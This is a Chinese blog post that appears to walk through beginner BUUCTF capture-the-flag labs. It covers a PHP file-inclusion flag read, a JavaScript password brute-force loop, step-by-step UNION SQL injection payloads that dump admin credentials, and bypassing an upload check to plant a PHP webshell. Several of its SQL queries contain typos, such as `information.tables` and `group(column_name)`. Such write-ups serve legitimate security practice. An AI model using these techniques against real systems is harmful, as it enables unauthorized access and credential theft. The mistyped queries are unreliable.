---
title: "BUUCFT 题解"
date: 2023-07-23T08:19:53+08:00
markup: pandoc
draft: false
categories:
- BUUCFT
tags:
- BUUCFT
- 题解
hash: fe85798f9dc0fb130ba13b576d5b8fb92586f85f
---

娱乐性质，玩一玩。

## Linux Lab

使用 ssh 连接到靶机即可。

```shell
ssh root@address -p port
```

flag.txt 就放在根目录下面。

## BUUCFT

打开页面，首先给了一段代码。

```php
<?php
/**
 * Created by PhpStorm.
 * User: jinzhao
 * Date: 2019/7/9
 * Time: 7:07 AM
 */

highlight_file(__FILE__);

if(isset($_GET['file'])) {
    $str = $_GET['file'];

    include $_GET['file'];
}
```

这里的意思是，高亮当前文件，判断是否存在为 file 的 query 参数，如果存在，就加载它。

尝试一下 `?file=flag.txt` ，文件不存在；尝试 `?file=flag` ，页面中显示了 flag 。

## 暴力破解 1

首先是一个登录页面，查看了一下 HTML 代码，很干净，没有任何其他的东西。尝试写了句 SQL 注入，不行，所以没有注入的口子。

![](../img/buuctf_brute_1.png)

尝试用户名，是 admin 。尝试密码 1234 ，结果报密码错误，密码为四位数字。这里就只能写代码遍历所有四位整数了。因为频繁请求会被 429 ，但慢慢请求又太慢，所以只能遇到一个 429 就等待一下。

```javascript
function sleep(time) {
    return new Promise((resolve) => {
        setTimeout(resolve, time);
    });
}

(async () => {
    for (let i = 1000; i <= 9999; i++) {
        const result = await fetch(
            "http://26a432d9-687e-4232-a5ae-68052673cfa1.node4.buuoj.cn:81/?username=admin&password=" +
            i,
        ).then((res) => res.text());

        console.log(i);
        if (!result.startsWith("密码错误")) {
            if (result.includes("429")) {
                await sleep(500);
                i--;
                continue;
            }
            console.log(result);
            console.log(i);
            break;
        }
    }
})();
```

跑完后，结果是 6490 。

## BUU SQL COURSE 1

看题目是 SQL 注入。

登录没有注入，是个幌子。注入点在获取新闻详情里。

使用 `id=1 and 1=1` ，无报错，正常回显，存在注入。

这里使用手动注入，首先要确定 SQL 返回结果的列数，使用 `id=1 order by 1` 来一个个往后推，到 `id=1 order by 3` 时结果有错，因此，结果字段是两列。

接下来确定数据库，`id=1 union select 1, database()` 。

然后确定数据库内有哪些表，`id=1 union select 1, group_concat(table_name) from information.tables where table_schema='news'` 。

确定有哪些列，`id=1 union select 1, group(column_name) from information.columns where table_name='admin'` 。

最后拿到 admin 的密码，`id=1 union select username,password from admin`

登录就可以拿到 flag 了。

关于 `information_schema` ：

1. 猜库：select schema_name from information_schema.schema
2. 猜库中的表：select table_name from information_schema.tables where table_shcema="xxx"
3. 猜表中列：select column_name from information_schema.columns where table_name="xxx"

## Upload-Labs-Linux 1

### Pass 1

提示说用了前端 JS 检查。因为本身 form 就可以上传文件，而 JS 在这里只是起到了检查的作用，我们直接禁用 JS 即可。当然，我们也可以通过接口请求来绕过，只要不走这个 JS 就行。

我们需要上传一个 [webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell) ，因为我用的需要上传两个文件，所以就上传了两遍。完成后查看回显地址，找到我们的 webshell 链接。一旦打开，我们就成功骇入了。

执行 `cat /flag` 即可获得 flag 。
